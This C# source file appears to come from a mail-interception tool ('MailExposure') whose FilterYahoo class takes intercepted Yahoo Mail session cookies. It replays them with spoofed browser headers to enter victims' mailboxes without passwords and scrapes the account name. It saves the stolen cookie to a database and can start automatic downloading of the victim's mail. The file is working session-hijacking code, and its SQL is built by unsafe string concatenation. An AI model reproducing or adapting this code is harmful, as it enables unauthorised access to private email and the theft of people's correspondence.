using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading;
using System.Net;
using System.Windows.Forms;

namespace MailExposure.CookieMailRC
{
    class FilterYahoo:DisplaceNew
    {
        // Fields
        private bool Auto;
        private string cookieRemarks;
        private string nameTemp;
        private string ower;
        private string strCookie;
        private string urls;
        private int userIndex;
        private string userListNames;
        private string UserName;
        private string userType;

        // Methods
        public FilterYahoo(string url, string strCookie, string interceptTime, string userList, bool Auto, string cookieRemarks)
        {
            this.urls = "";
            this.UserName = "";
            this.nameTemp = "";
            this.strCookie = "";
            this.userListNames = "";
            this.cookieRemarks = "";
            this.ower = "'capY'";
            this.userType = "'无密用户'";
            base.url = url;
            base.cookie = strCookie;
            this.strCookie = strCookie;
            base.interceptTime = interceptTime;
            this.userListNames = userList;
            this.Auto = Auto;
            this.cookieRemarks = cookieRemarks;

        }
        public void loginUser()
        {
            base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
            base.streamControl = true;
            base.MyStringBuilder = this.Request(base.url);
            if ((base.MyStringBuilder.ToString().Length < 800) && (base.MyStringBuilder.ToString().IndexOf("document.location.href") != -1))
            {
                this.urls = base.putstr(base.MyStringBuilder.ToString(), "'", "'", base.MyStringBuilder.ToString().IndexOf("document.location.href"));
                if (this.urls != "-1")
                {
                    base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                    base.streamControl = true;
                    base.MyStringBuilder = this.Request(this.urls);
                }
            }
            string message = base.MyStringBuilder.ToString();
            if (message.IndexOf("<a href=\"/ym/Folders?YY=") != -1)
            {
                this.UserName = "未知用户" + DateTime.Now.ToString("yyyMMddHHmmss");
            }
            else if (message.IndexOf("<a href=\"folders?") != -1)
            {
                this.UserName = "未知用户" + DateTime.Now.ToString("yyyMMddHHmmss");
            }
            else if (message.IndexOf("<a href='/ym/login?") != -1)
            {
                this.UserName = "未知用户" + DateTime.Now.ToString("yyyMMddHHmmss");
            }
            else if (message.IndexOf("Please verify your password") != -1)
            {
                GlobalValue.mainForm.listBoxView.Items.Add("[失败]:登陆失败-Please verify your password");
                GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
            }
            if (this.urls.IndexOf("/ym/login") != -1)
            {
                if (this.urls.IndexOf("jp") != -1)
                {
                    this.userIndex = message.IndexOf("id=jptoppimemail");
                    if (this.userIndex != -1)
                    {
                        this.nameTemp = base.putstr(message, ">", "@", this.userIndex);
                        if (this.nameTemp != "-1")
                        {
                            this.UserName = this.nameTemp;
                        }
                    }
                }
                else
                {
                    this.nameTemp = base.putstr(message, "<title>", "</title>", 0);
                    if (this.nameTemp != "-1")
                    {
                        this.nameTemp = base.putstr(this.nameTemp, "-", "@", 0);
                        if (this.nameTemp != "-1")
                        {
                            this.UserName = this.nameTemp.Trim();
                        }
                    }
                }
            }
            else if (((this.urls.IndexOf("mc") != -1) || (this.urls.IndexOf("in.mc") != -1)) || (this.urls.IndexOf("cn.mc") != -1))
            {
                this.userIndex = message.IndexOf("id=cnfullemailaddr");
                if (this.userIndex == -1)
                {
                    this.userIndex = message.IndexOf("id=\"cnfullemailaddr\"");
                }
                if (this.userIndex != -1)
                {
                    this.nameTemp = base.putstr(message, ">", "</strong>", this.userIndex);
                    if (this.nameTemp != "-1")
                    {
                        this.UserName = this.nameTemp.Trim();
                    }
                }
                else if (this.urls.IndexOf("us.mc") != -1)
                {
                    this.userIndex = message.IndexOf("Hi,");
                    if (this.userIndex != -1)
                    {
                        this.nameTemp = base.putstr(message, "\">", "</span>", this.userIndex);
                        if (this.nameTemp != "-1")
                        {
                            this.UserName = this.nameTemp;
                        }
                    }
                }
                else if (message.IndexOf("id=\"ygmahelp\"") != -1)
                {
                    this.userIndex = message.IndexOf("id=\"ygmahelp\"");
                    if (this.userIndex != -1)
                    {
                        this.nameTemp = base.putstr(message, "<strong style=\"color:#000;\">", "</strong>", this.userIndex);
                        if (this.nameTemp == "-1")
                        {
                            if (message.IndexOf("id=\"ygmagreeting\"") != -1)
                            {
                                this.userIndex = message.IndexOf("id=\"ygmagreeting\"");
                            }
                            this.nameTemp = base.putstr(message, "<strong>", "</strong>", this.userIndex);
                        }
                        if (this.nameTemp != "-1")
                        {
                            this.UserName = this.nameTemp.Trim();
                        }
                    }
                }
            }
            else if (this.urls.IndexOf("dc/launch") != -1)
            {
                this.userIndex = message.IndexOf("username");
                if (this.userIndex != -1)
                {
                    this.nameTemp = base.putstr(message, "'", "'", this.userIndex);
                    if (this.nameTemp != "-1")
                    {
                        if (this.nameTemp.Length < 40)
                        {
                            this.UserName = this.nameTemp.Trim();
                        }
                        else if (message.IndexOf("<defaultID>") != -1)
                        {
                            this.userIndex = message.IndexOf("<defaultID>");
                            this.nameTemp = base.putstr(message, "<defaultID>", "</defaultID>", this.userIndex);
                            if (this.nameTemp != "-1")
                            {
                                this.UserName = this.nameTemp.Trim();
                            }
                        }
                    }
                }
                else if (message.IndexOf("<defaultID>") != -1)
                {
                    this.userIndex = message.IndexOf("<defaultID>");
                    this.nameTemp = base.putstr(message, "<defaultID>", "</defaultID>", this.userIndex);
                    if (this.nameTemp != "-1")
                    {
                        this.UserName = this.nameTemp.Trim();
                    }
                }
            }
            else if (message.IndexOf("<yid>") != -1)
            {
                this.userIndex = message.IndexOf("<yid>");
                this.nameTemp = base.putstr(message, "<yid>", "</yid>", this.userIndex);
                if (this.nameTemp != "-1")
                {
                    this.UserName = this.nameTemp.Trim();
                }
            }
            if ((this.UserName != "") && (this.UserName != null))
            {
                if (this.urls == "")
                {
                    this.urls = base.url;
                }
                if (this.UserName.ToLower() == "mail")
                {
                    this.UserName = this.UserName + "(" + DateTime.Now.ToString("yyyMMdd-HHmmss") + ")";
                }
                string str2 = "'" + this.UserName + "'";
                string str3 = "'" + this.strCookie + "'";
                string str4 = "'Y'";
                string str5 = "'" + base.interceptTime + "'";
                string str6 = "'是'";
                if (this.cookieRemarks.Length > 0)
                {
                    this.ower = "'" + this.cookieRemarks + "'";
                }
                else
                {
                    this.ower = "'" + DateTime.Now.ToString("yyyMMdd") + "'";
                }
                string str7 = this.Auto ? "1" : "0";
                str7 = "'" + str7 + "'";
                this.userListNames = "'" + this.userListNames + "'";
                string strSql = "insert into users(属主,用户名,服务器,服务器地址,方向,邮件地址,验证登陆,时间限制,用户类型,全部接收,用户列表,自动收取) values(" + this.ower + "," + str2 + "," + str4 + "," + str4 + ",'capY','" + base.url + "'," + str3 + "," + str5 + "," + this.userType + "," + str6 + "," + this.userListNames + "," + str7 + ")";
                string str9 = "select count(*)from users where 服务器地址=" + str4 + "and 用户名=" + str2 + "and 用户类型=" + this.userType;
                string str10 = "update users set 邮件地址='" + base.url + "',验证登陆=" + str3 + " where 服务器地址=" + str4 + "and 用户名=" + str2 + "and 用户类型=" + this.userType;
                if (Convert.ToInt32(GlobalValue.mainForm.ExecuteSQL(str9)) <= 0)
                {
                    GlobalValue.mainForm.ExecuteSQL(strSql);
                    GlobalValue.mainForm.listBoxView.Items.Add("添加用户：" + this.UserName);
                    GlobalValue.mainForm.listBoxView.Items.Add("[" + this.UserName + "]: 结束过滤");
                    GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
                    foreach (TreeNode node2 in GlobalValue.mainForm.treeViewUsers.Nodes[0].Nodes)
                    {
                        if (node2.Text == this.userListNames.Trim(new char[] { '\'' }))
                        {
                            GlobalValue.mainForm.treeViewUsers.SelectedNode = node2;
                        }
                    }
                    if (this.Auto)
                    {
                        new BeginReceiveThreads(1, "Y", "Y", this.UserName, "", this.ower.Trim(new char[] { '\'' }), "capY", 0, base.url, this.strCookie, this.userType, this.userListNames.Trim(new char[] { '\'' })).Execute();
                    }
                }
                else
                {
                    str9 = "select 时间限制 from users where 服务器地址=" + str4 + "and 用户名=" + str2 + "and 用户类型=" + this.userType;
                    DateTime time = DateTime.Parse(GlobalValue.mainForm.ExecuteSQL(str9));
                    if (DateTime.Compare(DateTime.Parse(base.interceptTime), time) > 0)
                    {
                        GlobalValue.mainForm.ExecuteSQL(str10);
                        GlobalValue.mainForm.listBoxView.Items.Add("[" + this.UserName + "]:修改用户!");
                        GlobalValue.mainForm.listBoxView.Items.Add("[" + this.UserName + "]: 结束过滤");
                        GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
                        foreach (TreeNode node in GlobalValue.mainForm.treeViewUsers.Nodes[0].Nodes)
                        {
                            if (node.Text == this.userListNames.Trim(new char[] { '\'' }))
                            {
                                GlobalValue.mainForm.treeViewUsers.SelectedNode = node;
                            }
                        }
                        if (this.Auto)
                        {
                            new BeginReceiveThreads(1, "Y", "Y", this.UserName, "", this.ower.Trim(new char[] { '\'' }), "capY", 0, base.url, this.strCookie, this.userType, this.userListNames.Trim(new char[] { '\'' })).Execute();
                        }
                    }
                }
            }
            else
            {
                GlobalValue.mainForm.listBoxView.Items.Add("Cookie 可能已失效");
                GlobalValue.mainForm.listBoxView.Items.Add("结束过滤");
                GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
            }

        }
        private StringBuilder Request(string url)
        {
            try
            {
                StreamReader reader;
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";
                request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                request.AllowAutoRedirect = false;
                request.ServicePoint.Expect100Continue = false;
                request.KeepAlive = true;
                request.UserAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)";
                request.ContentType = "application/x-www-form-urlencoded";
                request.Headers.Add("Accept-Language: zh-cn,zh;q=0.5");
                request.Headers.Add("Cookie", base.cookie);
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                WebHeaderCollection headers = response.Headers;
                if (response.Headers["Set-Cookie"] != null)
                {
                    base.cookie = base.cook(response.Headers["Set-Cookie"]);
                }
                if (headers["Content-Type"] != null)
                {
                    string str = "";
                    str = headers["Content-Type"];
                    if (str.IndexOf("charset=") >= 0)
                    {
                        base.charSet = str.Substring(str.IndexOf("charset=") + 8, (str.Length - str.IndexOf("charset=")) - 8);
                    }
                }
                Thread.Sleep(10);
                if (((response.StatusCode == HttpStatusCode.Found) || (response.StatusCode == HttpStatusCode.MovedPermanently)) || ((response.StatusCode == HttpStatusCode.MovedPermanently) || (response.StatusCode == HttpStatusCode.Found)))
                {
                    this.urls = headers["location"];
                    if (this.urls.IndexOf("http") != -1)
                    {
                        this.Request(this.urls);
                    }
                }
                if ((base.charSet == null) || (base.charSet == "-1"))
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.Default);
                }
                else
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(base.charSet));
                }
                if (base.streamControl)
                {
                    base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                    for (string str2 = reader.ReadLine(); str2 != null; str2 = reader.ReadLine())
                    {
                        base.MyStringBuilder.Append(str2 + "\r\n");
                        str2 = null;
                    }
                    base.streamControl = false;
                }
                reader.Close();
            }
            catch (Exception exception)
            {
                GlobalValue.mainForm.listBoxView.Items.Add(exception.Message + exception.StackTrace);
                GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
            }
            return base.MyStringBuilder;

        }

    }
}
